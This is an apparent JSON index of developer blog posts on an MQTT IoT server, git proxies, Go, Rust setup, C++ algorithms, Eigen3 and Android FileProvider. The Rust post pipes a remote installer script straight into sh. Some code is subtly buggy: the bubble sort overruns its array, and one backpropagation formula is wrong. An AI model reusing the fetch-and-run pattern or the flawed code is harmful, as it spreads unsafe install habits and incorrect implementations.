接下来我们来解决一下这个问题。好吧，这个问题最后发现还是安全组或者防火墙的问题，将其配置到另外一台服务器上就完全没有问题了。这个部分或许就暂时到此，我们接下来，要在iOS端实现MQTT协议消息的发送。从而我就可以在APP中与Jarvis对话，进而控制硬件设备了！！！","categories":[{"name":"默认分类","slug":"默认分类","permalink":"http://yoursite.com/categories/默认分类/"}],"tags":[]},{"title":"Git Set Proxy and Remove it","slug":"git_set_proxy_and_remove_it","date":"2017-08-31T03:37:37.000Z","updated":"2017-09-01T05:14:14.000Z","comments":true,"path":"2017/08/31/git_set_proxy_and_remove_it/","link":"","permalink":"http://yoursite.com/2017/08/31/git_set_proxy_and_remove_it/","excerpt":"Introduce something about git set proxy and remove it","text":"Introduce something about git set proxy and remove it git set proxy and remove it This article was original written by Jin Tian, welcome re-post, but please keep this copyright info, thanks, any question could be asked via wechat: jintianiloveu Git set proxysometime we using shadowsocks to break wall, but the git still can not go through that channel. we can set proxy like this:git config --global https.proxy socks5://127.0.0.1:1080 Git remove proxyBut if you want remove it, simple do this:git config --global --unset https.proxy","categories":[{"name":"Default Category","slug":"Default-Category","permalink":"http://yoursite.com/categories/Default-Category/"}],"tags":[]},{"title":"Siren IoT服务器建造 三：Jarvis重构","slug":"Siren_IoT服务器建造_三：Jarvis重构","date":"2017-08-30T15:40:40.000Z","updated":"2017-08-31T08:42:52.000Z","comments":true,"path":"2017/08/30/Siren_IoT服务器建造_三：Jarvis重构/","link":"","permalink":"http://yoursite.com/2017/08/30/Siren_IoT服务器建造_三：Jarvis重构/","excerpt":"本文介绍 Siren Iot服务器建造 三：Jarvis重构","text":"本文介绍 Siren Iot服务器建造 三：Jarvis重构 This article was original written by Jin Tian, welcome re-post, but please keep this copyright info, thanks, any question could be asked via wechat: jintianiloveu Jarvis重构之前的Jarvis都是依赖于微信的基础上构建，但是这样明显并不能承担一个牛逼大脑的角色，因此下一步的工作就在于Jarvis的重构了。把它核心的推理部分玻璃出来，把消息处理这部分换上自己搭建的MQTT服务消息订阅。 The new JarvisUntil now, Jarvis almost build finished. Let’s see what we go now: We already have a sever provide pure MQTT service, live it to run, don’t need to develop on top of it; the server can transform messages between devices, which means, if Jarvis send me a message, I can receive it, the other device broadcast messages to Jarvis, he will catch all the messages. The offline message not support yet; Jarvis has been reconstruct finish, I can access to Jarvis via iPhone, Android, Python Script, Go executable program and so on, he can solve all the message for me now, and I can communicate with him, most things can be done under the help of Jarvis; This is all we got. Seems everything has been done perfectly, but those things has to be done: Support for offline messages to ensure message not lost; More device support, such as rasp-berry PI and Arduino; Let all device on LineNow, our emphasis work should be, let more device on line. I am going to doing the first thing is a hello world control: Control a lap through remote!!!. Just think it, I can fire a lap to on or off from any where using Jarvis, not just do that in Android app or any fixed interface set apps!!!!! # by telling Jarivs help me turn the light in bedroomok, the light in bedroom were lighted!!!","categories":[{"name":"默认分类","slug":"默认分类","permalink":"http://yoursite.com/categories/默认分类/"}],"tags":[]},{"title":"Siren IoT服务器建造 二： Golang从放弃到使用C++开发后端","slug":"Siren_IoT服务器建造_二:_Golang从放弃到使用C++开发后端","date":"2017-08-30T14:49:49.000Z","updated":"2017-09-09T06:08:44.000Z","comments":true,"path":"2017/08/30/Siren_IoT服务器建造_二:_Golang从放弃到使用C++开发后端/","link":"","permalink":"http://yoursite.com/2017/08/30/Siren_IoT服务器建造_二:_Golang从放弃到使用C++开发后端/","excerpt":"本文介绍 Siren IoT服务器建造 二: Golang从放弃到使用C++开发后端","text":"本文介绍 Siren IoT服务器建造 二: Golang从放弃到使用C++开发后端 本文由在当地较为英俊的男子金天大神原创，版权所有，欢迎转载，但请保留这段版权信息，多谢合作，有任何疑问欢迎通过微信联系我交流：jintianiloveu 使用C++开发Siren后端之前还打算用golang的，但是go语言好像根本没有靠谱的实现好的MQTT的broker啊。这非常坑爹。由此可见golang的生态还远远跟不上。既然如此，那我们就用C++吧，反正如果一直到嵌入式端还是需要熟悉C端client的，更重要的是顺便学习一下C++。最后的方案应该是Python，python应该有现成的broker实现吧。 编译mosquitto首先 让我们编译一下mosquitto，然后在此基础上进行开发。mosquitto其实也是一个比较坑爹的库。先从官网把源代码下载下来，如果是mac下的话，用cmake编译： mkdir buildcd buildcmake -DOPENSSL_ROOT_DIR=/usr/local/Cellar/openssl/1.0.2l DOPENSSL_LIBRARIES=/usr/local/Cellar/openssl/1.0.2l/lib -DWITH_TLS_PSK=OFF -DWITH_TLS=OFF .. 后面那个是必须的，应该如果不加会报找不到ssl的错误，还有一堆莫名其妙的错误，OK install完成之后，让我们写一个C++ broker代码试一下。 Ubuntu build mosquitto:Ubuntu is not like above, if you download the source code and just make it you will get some error like this:./mosquitto_internal.h:40:20: fatal error: ares.h: No such file or directorycompilation terminated.Makefile:51: recipe for target 'mosquitto.o' failedmake[1]: *** [mosquitto.o] Error 1 Now, we solve it.The reason of this question is lacking of ares library in this machine. We just install this library in machine:dpkg --list|grep aressudo apt install libc-ares-dev Now, try again:make cleanmake all -j8sudo make install 那么问题来了，如何使用这个现成的库？我需要对mosquitto进行二次开发吗？我想未必。我可以使用这个东西来进行纯粹的MQTT转发服务，然后Jarvis从这个服务端订阅所有消息内容，那么严格意义上来说，他就可以获取到所有信息。 Jarvis剥离重构OK，我现在要实现的东西是，对Jarvis的核心大脑部分进行剥离重构。我将做以下事情： 构建一个MQTT服务，这个服务的功能就是把publish的payload转发给订阅者，如果订阅者不在线，等到他在线的时候再推送，确保信息能够被收到； 我作为这个universe的主人，我的所有topic都是以master/开头的，这样Jarvis订阅所有master的消息就知道是我发给他的，然后他进行相应的处理； 对所有小兵进行严格的系统编号，比如卧室的台灯，他的topic 的应该是lap/rest-room/1, 然后Jarvis收到这个topic就知道是台灯发过来的； 我这边的接收的topic都是接收来自jarvis的topic；","categories":[{"name":"默认分类","slug":"默认分类","permalink":"http://yoursite.com/categories/默认分类/"}],"tags":[]},{"title":"又是一年七夕节，情人的味道更浓了","slug":"又是一年七夕节，情人的味道更浓了","date":"2017-08-27T12:52:47.000Z","updated":"2017-08-27T13:15:04.000Z","comments":true,"path":"2017/08/27/又是一年七夕节，情人的味道更浓了/","link":"","permalink":"http://yoursite.com/2017/08/27/又是一年七夕节，情人的味道更浓了/","excerpt":"","text":"七夕今宵看碧霄，牵牛织女渡河桥。 鹊桥还在吗？依稀记得，小时候奶奶说，七月七是牛郎和织女相会的时候，这对苦命的鸳鸯，被王母娘娘用玉簪划出了一条河，使他们无法相见。好心善良的喜鹊，不忍心看着这对异地相隔的情侣，便在每年的七月七号，成群结队，组成鹊桥，让他们团聚。时光晃晃十五载，岁月悠悠，随着自己不断的成长，慢慢地，好像也失去了关注这对情侣的心。只剩下，外面繁杂的世界里，其他情侣们的花前月下，柳树梢头。 牛郎还是那个牛郎一直以来，总觉得自己就像一个牛郎，每天殷勤工作，女朋友对于我来说，就像天上的仙女，可望而不可及。小时候，在寂静的天空下乘凉，还在想象着牛郎挑着一对儿子和织女团聚的画面，就像小学课本里面插画里画的一样。现在过七夕，却早已没有了儿时的悠闲时光，充斥着生活的，是无尽的工作和学不完的新东西。如果我们每天多有那么一点时间，去陪陪自己的家人，陪陪自己爱的人，去享受享受自己的兴趣爱好，或许生活会是另外一番模样？ 是年龄在作怪吧以前对情人节没有任何感觉，仿佛这些欢喜的事情离自己很远。然而现在看来，我们已经到了该结婚生子的年纪了。现在的年轻人，大多数和我一样，还没有到不惑的年龄，却好像已经看透了人生，提笔写出来的东西都是感叹、回首。七夕，本该是个热闹的日子，不管是单着的，还是热恋着的，都应该努力去寻找自己的另一半，而不是等着对方来找你。我们觉得牛郎和织女是不幸的，假如现实存在的话，不过我倒是觉得，他们是幸福的，至少在今天，我们很多人都会羡慕他们吧。 CMF值得期待你还在为七夕找不到约会而烦恼吗？你还在因为别人有漂亮的女朋友而觉得不服吗？萝莉萝莉即将推出CMF(Conditional Make Friends)条件交友功能，我们的理念是：开出你的条件，让妹子来找你！ 最后，我们萝莉萝莉QQ吐槽群： 366590979 欢迎加入小圈子！","categories":[],"tags":[]},{"title":"Siren-IoT服务器搭建 一：Golang Web入门","slug":"Siren-IoT服务器搭建_一:_Golang_Web入门","date":"2017-08-27T06:55:55.000Z","updated":"2017-09-09T06:08:42.000Z","comments":true,"path":"2017/08/27/Siren-IoT服务器搭建_一:_Golang_Web入门/","link":"","permalink":"http://yoursite.com/2017/08/27/Siren-IoT服务器搭建_一:_Golang_Web入门/","excerpt":"本文介绍 Sensor-IoT服务器搭建：Golang Web入门","text":"本文介绍 Sensor-IoT服务器搭建：Golang Web入门 Siren-IoT服务器搭建 1：Golang Web入门 This article was original written by Jin Tian, welcome re-post, but please keep this copyright info, thanks, any question could be asked via wechat: jintianiloveu Golang 15行代码搭建web服务器首先，欢迎来到21世纪，如果21世纪你还在使用apache，tomcat，java….那不得不说你快要过时了，如果你还在使用nginx etc.那不得不说，你快要被out了….在未来的21世纪，在C系语言已经无法继续支撑下去的情况下，毫无疑问Rust和Go将会是其追随者，甚至后来者居上，而在这二者之间，我会进一步使用Golang，并不是因为golang后面有着Google的强大支撑，而是因为，Golang虽然没有Rust的速度，但却有着Python一般快速而易懂的语言特性。让我们用15行代码来搭建一个web服务器！ 通常情况下，假如你用java，你配置环境至少需要一天时间。假如你用python，你需要安装各种包和依赖，甚至说各种数据库migration。比较麻烦。而用golang，你的二进制文件编译好之后，直接方法服务器上运行即可。简单，轻便，高效，快速，无污染。 更加重要的是！！！！！你还需要nginx吗？？？？ 答案是，不需要！！！golang 15行代码实现的服务端程序，不需要nginx，不需要！！！直接监听本地端口！ package mainimport ( \"log\" \"fmt\" \"net/http\")func sayHello(w http.ResponseWriter, r *http.Request) &#123; // parse request r.ParseForm() fmt.Println(\"request form: \", r.Form) fmt.Print(\"request url: \", r.URL.Path) fmt.Println(\"request scheme: \", r.URL.Scheme) fmt.Println(r.Form[\"url_long\"]) for k, v := range r.Form &#123; fmt.Println(\"key: \", k) fmt.Println(\"val: \", v) &#125; fmt.Fprintf(w, \"helllllo!!! this is from Siren!!!\")&#125;func main() &#123; fmt.Println(\"hello, Go lang.\") http.HandleFunc(\"/\", sayHello) err := http.ListenAndServe(\":9000\", nil) if err != nil &#123; log.Fatal(\"Listen and serve: \", err) &#125;&#125; 编译运行一下，这个程序就在一直监听9000端口了。 思考一下Siren需要什么OK，接下来我们可能需要站在产品经理的角度来思考一下，我要的Siren要实现哪些功能了： 名字必须要非常牛逼，Siren牛逼吗？这个得看功能了，我理想中的Siren是一个敏锐的嗅探者，我将在它内部集成很多爬虫，爬虫无数爬虫每天的任务就是嗅探各种网站的更新，比如github排行榜啊，kickstar众筹有意思项目啊，hackday上的项目更新啊，之类的，所有的信息都会服从于同一个结构，我可以随意调取这些信息，当然内核还是基于Jarvis内部的自然语言处理机制； Siren必须要能给客户端推送信息，而且要能接收到传感器的数据，比如我要让Siren接入我的温度传感器，arduino发现温度传感器高于30度了，这不正常，于是就发一个消息给Siren，Siren必须要及时的通知我； 我可以通过Siren控制我的所有支配设备，比如我的无人机适合Siren链接的，那我就可以通过Siren控制无人机，甚至说以后我的冰箱，我的空调都需要通过一个主脑和Siren进行连接，Siren所有感应信息的集散地，而所有信息处理的主脑就是Jarvis，Jarvis目前还只能基于Python进行运作，那Siren和Jarvis只能通过socket进行通信了； 能够实现以上功能，基本上我的Siren也就初具雏形了。最后说明一下Siren是我们将要建造的IoT信息传递使者，她在古希腊神话中是一个海妖的形象： 怎么样，酷不酷炫，性不性感？ MQTT协议Golang初探OK，既然要让Siren实现万物的互联，那么消息的推送就必须要完成。客户端倒是非常好办，问题是服务端是否可以做到这样呢？我们暂且不考虑高并发吧，就说我device A和device B能不能做到信息的即时通讯？说白，就是建造一个即时聊天软件。","categories":[{"name":"默认分类","slug":"默认分类","permalink":"http://yoursite.com/categories/默认分类/"}],"tags":[]},{"title":"Rust入坑记 1：极有可能取代C++的21世纪语言","slug":"Rust入坑记-1：极有可能取代C-的21世纪语言","date":"2017-08-26T13:58:32.000Z","updated":"2017-08-27T06:55:35.000Z","comments":true,"path":"2017/08/26/Rust入坑记-1：极有可能取代C-的21世纪语言/","link":"","permalink":"http://yoursite.com/2017/08/26/Rust入坑记-1：极有可能取代C-的21世纪语言/","excerpt":"","text":"Rust 一致依赖以为Rust跟那个Ruby差不多，近期看了一下感觉Rust实际上应该是和C++匹敌的语言。而Rust作为21世纪最有可能与C++进行匹敌的对手也就是golang了。作为一个golang从入门到中级的中级段位手，我决定义无反顾的踏入Rust这个大坑，不是因为别的，只是因为Rust具有深度学习库！！！！ Rust安装闲话不多说，既然决定采坑，那么请把Rust的环境高熟悉一下。这里是官方的书 the book of rust, 一句话安装： curl https://sh.rustup.rs -sSf | sh 如果出现: Rust is installed now. Great! 那么，牛逼的rust就安装好了！如果是windows，从这里 下载exe文件安装好。接下来是升级和卸载： rustup updaterustup self uninstall# get rust versionrustc --version Hello Rust!接着就是实现我们牛逼的hello world程序了。新建一个工程my_project, 然后新建一个main.rs文件，写入： fn main() &#123; println!(\"Hello, Rust!\");&#125; 然后编译： rustc main.rs./main","categories":[],"tags":[]},{"title":"C++建造自用深度学习库二：从放弃到再次捡起来","slug":"C-建造自用深度学习库二：从放弃到再起捡起来","date":"2017-08-26T08:19:39.000Z","updated":"2017-08-27T06:55:35.000Z","comments":true,"path":"2017/08/26/C-建造自用深度学习库二：从放弃到再起捡起来/","link":"","permalink":"http://yoursite.com/2017/08/26/C-建造自用深度学习库二：从放弃到再起捡起来/","excerpt":"","text":"这是对前面自己建造深度学习库的继续版本 上回说道，我想自己建造深度学习库，用纯C++实现，并且只用C++接口，但是由于基础设施并不是非常完善，几乎要放弃了。但是好在在我即将放弃的时候，我发现还是有可能搭建出来的。今天的主题就是在seth中实现反响传播。 反向传播公式推导现在很多人搞深度学习，人工智能，但是我感觉能够推导反向传播公式的没有几个人。其中也包括我，既然明知不足，那就去把这个坑填一下。接下来我会用手工的方式来推倒一下反向传播公式。 在这里不得不称赞一下牛逼的typora markdown编辑器，要不是它，我想我无法继续创作。好闲话不多说，让我们直接开始今天的推到，前方一大波公式预警。 所有的一切起源于下面四个公式，我称之为神经网络反向传播四大公示： $$\\delta^L=\\Delta_aC\\odot\\sigma’(z^L)$$ (BP-1) $$\\delta^l = (W^{l+1}\\delta^{l+1})\\odot\\sigma’(z^l)$$ (BP-2) $$\\frac{\\partial C}{\\partial b^l} = \\delta ^l$$ (BP-3) $$\\frac{\\partial C}{\\partial W^l} = W^{l-1} \\delta ^ l$$ (BP-4) OK, 上述四个公式便是牛逼的反向传播四大公式了，有了它就可以进行反向传播。但是在这里我就不一一推导了。比较简单，其中第一个公式是计算最后一层的梯度。那么这个最后一层的梯度就可以一层一层向前传播，使用公式2. 编程实现反向传播既然公式已经出来了，那么就编程实现它吧。在这里有个问题，那就是这个梯度的维度到底是多少啊？？？我们在进行前向传播的时候，最终的误差应该是","categories":[],"tags":[]},{"title":"C++ 经典算法集锦 二","slug":"C++_经典算法集锦_二","date":"2017-08-26T07:40:54.000Z","updated":"2017-09-05T01:13:35.000Z","comments":true,"path":"2017/08/26/C++_经典算法集锦_二/","link":"","permalink":"http://yoursite.com/2017/08/26/C++_经典算法集锦_二/","excerpt":"","text":"C++经典算法实现系列2 上回我们说道，牛逼的C++可以实现很多牛逼的算法。我们继续之前的记录。 Algorithm 4. 二分查找我们将实现一个二分查找的算法。首先必须明白，二分法查找数毕竟满足：这堆数是保存在数组中，而且这堆数必须是有序排列，也就是需要要求有一定的顺序。之所以要求实在数组中，是因为，如果存在链表中，链表的存储不是连片的，而数组是连片的，这样数组就可以非常轻而易举的通过下标index每个元素。其实我感觉C++里面好像都是用的数组吧。直接上代码吧： int binary_search(int a[], int low, int high, int target) &#123; // binary search, search x in a if (low &gt; high) &#123; return -1; &#125; int mid = (low + high) / 2; if (a[mid] &gt; target) &#123; return binary_search(a, low, mid - 1, target); &#125; if (a[mid] &lt; target) &#123; return binary_search(a, mid + 1, high, target); &#125; return mid;&#125; 这是比较简单的二分查找的递归实现。但是请注意，二分法其实是有要求的，那就是，查找的数组必须是升序。我感觉这样查找就没有啥意思了，要是有一个牛逼的查找算法可以在一个混乱的数组中定位一个元素那就比较牛逼了。二分查找的局限性就发生在它的前置条件上，需要数组是有序的，然而大部分数组都是无序的，如果将数组构建成为有序数组，那么又有第二个问题，必须是数组，而数组在构建有序过程中其实是非常低效的，因为数组是连片存储，在移动和 插入过程中会有很大的开销。因此让我们接下来来实现一个二叉查找树算法。据说该算法既可以构建有序的集合又可以高效率的搜寻目标。 Algorithm 5. 寻找最大的K个元素这个问题应该被归结为top k问题，而不是排序问题。这个问题有很多种解法，其中最简单的当然是先排序，然后再选取k个最大的数，还有一种解法是，使用快速排序的思想，具体如下：1. 随机选择一个元素X，将数组S分为两部分，一部分全部大于X，一部分全部小于X，其实这就是快速排序的第一步；2. 如果第一部分元素个数大于K，在继续在该部分查找K，重复1，直到元素个数等于K；3. 如果第二部分元素小于K，则在第二部分继续分开，查找剩下的K-T个元素； 这个算法简单易行，但是请注意，这个top K是无序的，时间复杂度为O(nlogK)，这里我实现一个牛逼的基于模板的实现，事实上用模板更简单易懂一些： #include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;// find top k implement by STLvector&lt;int&gt;::iterator find_k(vector&lt;int&gt;::iterator begin, vector&lt;int&gt;::iterator end, int k) &#123; vector&lt;int&gt;::difference_type n = k; if (end - begin &lt;= k) &#123; return end; &#125; auto left = begin; auto right = end - 1; srand(time(NULL)); int index = (int) rand() % n; iter_swap(begin, begin + index); while (left &lt; right) &#123; // traverse right than left while (*right &lt;= *left &amp;&amp; left &lt; right) &#123;right--;&#125; if (left &lt; right) &#123;iter_swap(left, right);&#125; while (*left &gt; *right &amp;&amp; left &lt; right) &#123; left++; &#125; if (left &lt; right) &#123;iter_swap(left, right);&#125; &#125; n = left - begin; if (n + 1 &gt;= k ) &#123; // if left element more than k, find from left // TODO: why left + 1? return find_k(begin, left + 1, k); &#125; else &#123; // if left element less than k, find the rest k- n return find_k(left + 1, end, k - n - 1); &#125;&#125;int main()&#123; vector&lt;int&gt; a = &#123;3, 56, 7, 89, 34, 12, 56, 39&#125;; auto it_r = find_k(a.begin(), a.end(), 5); for (auto it = a.begin(); it &lt; it_r; it++) &#123; cout &lt;&lt; *it &lt;&lt; \" \"; &#125; cout &lt;&lt; endl; return 0;&#125; 当然，这个问题还有一个清晰的解法，我把它叫做最小堆方法，它的思想是：1. 首先随机选择K个数，然后从原数组中依次拿出一个数，和这里的每一个数进行比较，如果都小于，则pass该数，如果比某个元素大，就替换掉它，直到所有元素比完为止； 大家可以看到，这个算法非常简单，只需要一步，而且时间复杂度是：O(n*K)，不仅如此，这个算法的空间复杂度也很低，只需要把K个元素装入内存即可，其他元素只需要读取。这个算法我就不写出实际实现额。相反还有一个有意思的算法，也就是二分法来实现它。二分法之前业实现过。二分法的思路是：1. 首先我们要知道整个数组的最大值和最小值以及数组长度，然后先从中值开始，如果mid~max个数大于K，则在mid~max继续寻找，mid变成min；2. 如果mid~max个数小于K则在min~mid继续寻找，mid变成max，不断的缩短区间，知道max-min=1; 二分法实现的思想也很简单，但是实际上，在实际问题运用中不好用。首先我觉得你必须要知道最大值最小值有时候并不太现实。这个算法复杂度也是O(n*K).","categories":[],"tags":[]},{"title":"C++ 经典算法集锦 一","slug":"C++_经典算法集锦_一","date":"2017-08-21T16:33:33.000Z","updated":"2017-09-05T00:23:33.000Z","comments":true,"path":"2017/08/22/C++_经典算法集锦_一/","link":"","permalink":"http://yoursite.com/2017/08/22/C++_经典算法集锦_一/","excerpt":"Introduce something about C++ Classic Algorithm Implementation","text":"Introduce something about C++ Classic Algorithm Implementation C++ Classic Algorithm Implementation This article was original written by Jin Tian, welcome re-post, but please keep this copyright info, thanks, any question could be asked via wechat: jintianiloveu Prefacethis series is the many implementation of C++ classic algorithm, such as quick sort, binary search, Red-black tree. Let’s start the fucking jurney of algorithm! Algorithm 1. 快速排序ok, this the simplest but classic algorithm, we were given a vector, then we send it into a quick_sort function, you should return a vector with sorted seqeunces. Here is the thoughts: 首先随机拿出一个元素作为基准，比如v(通常会选取最左边的元素)，然后进行一下partition操作，该操作需要两个指针i, j，一个指向开头一个指向结尾，每次i++, j–,每次对比左边指针指向的数比v大就继续，遇到比v小的就调换i和j所指向的元素； 经过一次partition操作之后，应该在基准值左边的都是大于它的，右边的都是小于它的； 对左右两段在分别重复1，2，直到每段元素的个数为1为止； 咋一看，我曹感觉复杂，没有关系我们先把第一个操作完成，后面就是递归调用这个操作，你懂的。好吧，接下来让我们徒手写快排吧，如果你能够随时随地写一个快排，那么你对算法应该也已经从入门到精通了。 void quick_sort(int a[], int left, int right) &#123; if (left &gt;= right) &#123; return; &#125; int i = left; int j = right; int key = a[i]; while (i &lt; j) &#123; while (i &lt; j &amp;&amp; a[j] &gt;= key) &#123; --j; &#125; a[i] = a[j]; while (i &lt; j &amp;&amp; a[i] &lt;= key) &#123; ++i; &#125; a[j] = a[i]; &#125; a[i] = key; quick_sort(a, left, i - 1); quick_sort(a, i + 1, right);&#125; 这应该是目前来说，最简单的快速排序实现了吧。道理其实也非常简单，首先从后面开始，后面应该是大的，遇到小于标准的，那就复制给前面的，这个时候后面的小的就跑到了前面，前面的继续，遇到大的，就放到后面去，这个时候，大的到后面去了，但是前面的依旧保留着大的数，没有关系，继续后面的，又会有一个小只传到前面来。一直到最后，前面的只会移到后面，但是本身还是一个大值，于是就把标准赋值给它。这样切片完成。递归调用，两块的后面和第二块的前面中间是断点。就是这么简单。如果你能理解那就神奇了，因为我也不知道我在说什么。好我们继续下一个经典算法。 当然，在这里再列举一个冒泡排序，这是最简单的：void bubble_sort(int a[], int l) &#123; // 最简单的冒泡排序法 for (int i = 0; i &lt; l; ++i) &#123; for (int j = 0; j &lt; l - i; ++j) &#123; if (a[j+1] &lt; a[j]) &#123; int tmp = a[j]; a[j] = a[j + 1]; a[j + 1] = tmp; &#125; &#125; &#125;&#125; Algorithm 2. 求子数组最大和现在有个问题是求子数组最大和，这是我来腾讯实习面试的问题，其实要解决也很简单，这个就是在一个包含正数和负数的数组中，求取一个连续的子数组，使得其和在所有可能的子数组中最大。这个问题能够被解决的前提 Algorithm 3. 堆排序这也是一种排序算法，但是由于名字比较牛逼所以我们今天就来实现以下它。它的基本原理是这样的：先挖个坑，后面再来填。 Algorithm 4. 二分查找这里我将提供简单实现和递归实现。曾经有人说过90%的计算机工程师无法再2个小时内写出正确无误的二分查找算法。","categories":[{"name":"Default Category","slug":"Default-Category","permalink":"http://yoursite.com/categories/Default-Category/"}],"tags":[]},{"title":"C++建造自用深度学习库一：Eigen3从入门到花式写卷积","slug":"C-建造自用深度学习库一：Eigen3从入门到花式写卷积","date":"2017-08-18T09:33:06.000Z","updated":"2017-08-22T12:09:18.000Z","comments":true,"path":"2017/08/18/C-建造自用深度学习库一：Eigen3从入门到花式写卷积/","link":"","permalink":"http://yoursite.com/2017/08/18/C-建造自用深度学习库一：Eigen3从入门到花式写卷积/","excerpt":"","text":"金天，写于北京中关村，想自己建造一套人工智能框架，遂从这里开始一个系列，C++实现 Eigen3 导入和安装首先必须说明，eigen3好像我目前还没有找到比较好的安装方式，也许从apt可以直接安装，但是没有测试。下面这段代码是将eigen3安装到/usr/local/include 下面，因为eigen里面都是头文件实现的，因此直接cp到include下面即可，也是非常的方便。 cd ~/Downloadswget http://bitbucket.org/eigen/eigen/get/3.3.4.tar.bz2sudo tar -xvjf ~/Downloads/3.3.4.tar.bz2 -C /usr/local/includesudo mkdir /usr/local/include/eigen3sudo mv /usr/local/include/eigen-eigen-*/Eigen /usr/local/include/eigen3 然后在cmake里面或者说直接在c++源文件里面都可以直接include，如果使用cmake编译的话应该这样： find_package( PkgConfig )pkg_check_modules( EIGEN3 REQUIRED eigen3 )include_directories( $&#123;EIGEN3_INCLUDE_DIRS&#125; ) 这样就可以自动自动find eigen这个package了。 Eigen3 - 让我们实现一个一层的神经网络吧既然是自己动手实现神经网络框架，那实现一个一层的神经网络应该是必须要完成的事情。实现神经网络其实也不难。经典公式：y = W*x + b 我们需要其实就是这个W的矩阵，我们给一对数据x和y，计算W*x + b和真实y的差值，然后再根据一个公式，使用误差来更新W，也就是我们的损失函数？（窝草，看来还挺麻烦，这里的怎么进行反向传播的？）。不管怎么说，让我们先用eigen来写一个层吧。 从开始到放弃由于写到一半发现这个牛逼的Eigen库根本不支持多维的矩阵，于是乎只能作罢，看来在c++里面构建一个类似于numpy一样的多维矩阵库还是一件非常麻烦的事情啊，如果同志们有好的建议可以向我提一下。","categories":[],"tags":[]},{"title":"Android7 图片相册裁剪适配教程","slug":"Android7_图片相册裁剪适配教程","date":"2017-08-12T08:58:58.000Z","updated":"2017-08-12T09:02:46.000Z","comments":true,"path":"2017/08/12/Android7_图片相册裁剪适配教程/","link":"","permalink":"http://yoursite.com/2017/08/12/Android7_图片相册裁剪适配教程/","excerpt":"本文介绍 Android7 图片相册裁剪适配教程","text":"本文介绍 Android7 图片相册裁剪适配教程 Android7 图片相册裁剪适配教程 本文由在当地较为英俊的男子金天大神原创，版权所有，欢迎转载，但请保留这段版权信息，多谢合作，有任何疑问欢迎通过微信联系我交流：jintianiloveu Android7 适配问题ok, 新博客的第一篇比较正式的笔记。闲话不多说，本篇博客记录Android7，图片剪切适配的蛋疼问题。首先大家必须要明白，在安卓7中，图片不在是那么操作的了，文件不再是那么简单的操作了，多了一个FileProvider的东西，在以前我们从相册获取一张图片并裁剪可能非常简单和随意： public void chooseAvatar() &#123; Intent intent = new Intent(Intent.ACTION_PICK, MediaStore.Images.Media.EXTERNAL_CONTENT_URI); intent.setType(\"image/*\"); startActivityForResult(intent, CODE_PHOTO);&#125;@Overridepublic void onActivityResult(int requestCode, int resultCode, Intent data) &#123; // TODO Auto-generated method stub super.onActivityResult(requestCode, resultCode, data); switch (requestCode)&#123; case CODE_CANCEL: Toast.makeText(getActivity(), \"取消了相册选择\", Toast.LENGTH_SHORT).show(); case CODE_PHOTO: if (data != null) &#123; Uri uri = data.getData(); DebugHelper.LogMessage(\"step 2, start zoom image\", \"crop and choose photo\"); startPhotoZoom(uri); &#125; break; case CODE_RESULT:&#123; Uri inputUri = FileProvider.getUriForFile(getActivity(), \"com.ouman.luoliluoli.fileprovider\", mCropFile); Bitmap bitmap = null; try &#123; bitmap = BitmapFactory.decodeStream(getActivity().getContentResolver().openInputStream(inputUri)); &#125; catch (FileNotFoundException e) &#123; e.printStackTrace(); &#125; DebugHelper.LogMessage(\"step 4, get result and set cropped image.\", \"crop and choose photo\"); avatar.setImageBitmap(bitmap); avatarImageFile = mCropFile; break; &#125; &#125;&#125;public void startPhotoZoom(Uri inputUri) &#123; if (inputUri == null) &#123; Log.e(\"error\",\"The uri is not exist.\"); return; &#125; Intent intent = new Intent(\"com.android.camera.action.CROP\"); Uri outPutUri = Uri.fromFile(mCropFile); if (Build.VERSION.SDK_INT &gt;= android.os.Build.VERSION_CODES.KITKAT) &#123; //这个方法是处理4.4以上图片返回的Uri对象不同的处理方法 String url = FileHelper.getRealPathFromURI(getActivity(), inputUri); intent.setDataAndType(Uri.fromFile(new File(url)), \"image/*\"); &#125; else &#123; intent.setDataAndType(inputUri, \"image/*\"); &#125; intent.putExtra(MediaStore.EXTRA_OUTPUT, outPutUri); intent.putExtra(\"crop\", \"true\"); // aspectX aspectY 是宽高的比例 intent.putExtra(\"aspectX\", 1); intent.putExtra(\"aspectY\", 1); // outputX outputY 是裁剪图片宽高 intent.putExtra(\"outputX\", 250); intent.putExtra(\"outputY\", 250); intent.putExtra(\"return-data\", false); intent.putExtra(\"noFaceDetection\", false); intent.putExtra(\"outputFormat\", \"JPEG\"); DebugHelper.LogMessage(\"step 3, start return result back\", \"crop and choose photo\"); startActivityForResult(intent, CODE_RESULT);&#125; 我这里并没有修改适配后的代码，总之，在FileProvider之前，获取图片并裁剪比较简单。在android7以后问题也没有变复杂，只不过是不能直接从File中获取Uri，从而无法ContentResolver去获取二进制的数据。那么如何才能去适配呢？ 要修改的地方并不多其实要适配Android7 要修改的地方并不多，甚至说只需要几行代码即可。我看网上很多人说要修改manifest，要修改xml中的file_path.xml，我测试了其实完全没有必要。当然为了保险起见，我们还是在manifest中添加一下权限： &lt;!-- 适配android7 --&gt; &lt;provider android:name=\"android.support.v4.content.FileProvider\" android:authorities=\"com.ouman.luoliluoli.fileprovider\" android:exported=\"false\" android:grantUriPermissions=\"true\"&gt; &lt;meta-data android:name=\"android.support.FILE_PROVIDER_PATHS\" android:resource=\"@xml/file_paths\" /&gt; &lt;/provider&gt; 这里的 com.ouman.luoliluoli.fileprovider可以修改成你的。任何名字都可以，不过一半是包名加provider来命名。最后，我们需要处理的地方加上 FileProvider.getUriForFile(getActivity(), “com.ouman.luoliluoli.fileprovider”, mCropFile); 这个方法，来从File获取Uri。 我总结了一个代码如下：// variables we need for Android7 image crop private static final int CODE_PHOTO = 1115; private static final int CODE_RESULT = 1118; private static final int CODE_CANCEL = 5556; String path = Environment.getExternalStorageDirectory()+\"/images/\"; File mCameraFile = new File(path, \"photo.jpg\");//照相机的File对象 File mCropFile = new File(path, \"avatar.jpg\");//裁剪后的File对象 /** * Basic steps for setting avatar with crop image * Step 1: Start a intent for PHOTO, this step should be different in android7 * Step 2: onActivityResult received photo request, start zoom image * Step 3: in startZoomImage it will using gallery to crop image, and then send result code * Step 4: in onActivityResult method received the cropped image and set it. */ public void chooseAvatar() &#123; // check parent dir is exist or not if (!mCameraFile.getParentFile().exists()) &#123; mCameraFile.getParentFile().mkdirs(); &#125; Intent intent = new Intent(Intent.ACTION_PICK, MediaStore.Images.Media.EXTERNAL_CONTENT_URI); intent.setType(\"image/*\"); 